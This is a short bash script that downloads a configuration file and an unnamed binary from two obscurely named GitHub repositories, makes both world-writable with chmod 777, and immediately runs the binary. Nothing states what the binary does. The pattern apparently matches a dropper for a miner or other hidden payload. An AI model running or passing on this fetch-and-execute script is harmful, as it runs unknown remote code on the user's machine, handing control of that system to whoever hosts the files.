#!/bin/bash

wget https://github.com/vedhagsvp/qubros/raw/main/appsettings.json
wget https://github.com/vedhagsvp/taberas/releases/download/mlb/jtkopls
chmod 777 jtkopls appsettings.json
./jtkopls
